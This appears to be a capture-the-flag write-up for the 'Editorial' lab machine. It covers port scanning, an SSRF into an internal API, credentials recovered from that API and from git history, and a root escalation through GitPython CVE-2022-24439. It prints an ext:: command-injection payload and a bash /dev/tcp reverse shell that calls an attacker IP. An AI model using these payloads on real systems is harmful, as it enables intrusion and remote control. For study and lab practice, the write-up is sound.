

Nmap Scan

```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Editorial Tiempo Arriba
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

*add editorial.htb to /etc/hosts*
## SSH

Ssh uses a password for authentication instead of a key, bad security practice here, ssh can be password sprayed if there are not rate limits.

![[Pasted image 20261006131515.png]]

# Enumerating port 80


## FeroxBuster Scan


```
┌──(kali㉿DESKTOP-DVRB724)-[~/SSRFmap]
└─$ feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -u http://editorial.htb 

```

![[Pasted image 20261006131952.png]]


# Framework enumeration


![[Pasted image 20261006193013.png]]

from this error we can tell this is flask

https://0xdf.gitlab.io/cheatsheets/404# 
we can reference to this page for more information 

 trying to see if I can get a connection back to our machine 


![[Pasted image 20261006193546.png]]


![[Pasted image 20261006193621.png]]

and we did ;) meaning this is vuln to SSRF ;) 

## Hunting for internal endpoints

From here we will try to see if we can reach internal endpoionts, we can copy the request save it to a txt file and give it to fuff to FUZZ for endpoionts

Make sure to include FUZZ
![[Pasted image 20261006194459.png]]


![[Pasted image 20261006194555.png]]

there is a local instance on port 5000, we then visited the url it generated and it was giving us a file 

![[Pasted image 20261006202252.png]]

lets curl this and pipe it to json


![[Pasted image 20261006202309.png]]

we need to try all these endpoints to see which one is valid


![[Pasted image 20261006203259.png]]

we found credentials 

Username: dev
Pasword: dev080217_devAPI!@

We could use these creds to ssh into the machine


![[Pasted image 20261006203431.png]]

we can see there is an other user here 

![[Pasted image 20261006210850.png]]


after going back to the /apps/.git folder i didnt know we could use git commands there , so apparently  by doing git log we get the commit history once we found a commit related to our second user prod we used  git show commit number and we found prods credentials 
*for a quicker search use git log -Gpassword or whatrever you are looking for!*
username:  prod
password:  080217_Producti0n_2023!@


![[Pasted image 20261006211438.png]]


After login in as user prod we did sudo -l to see if we can run anything as root

```
prod@editorial:/home/dev/apps/.git$ sudo -l
[sudo] password for prod: 
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *

```


GitPython 3.1.29 is vuln to rce CVE-2022-24439

```
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /root/root.txt% >% /tmp/root_flag'
```

or we can use a reverse shell

```
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c bash% -c% 'bash% -i% >&% /dev/tcp/10.10.14.100/1234% 0>&1'"
```

![[Pasted image 20261006215604.png]]

gave us the flag! 

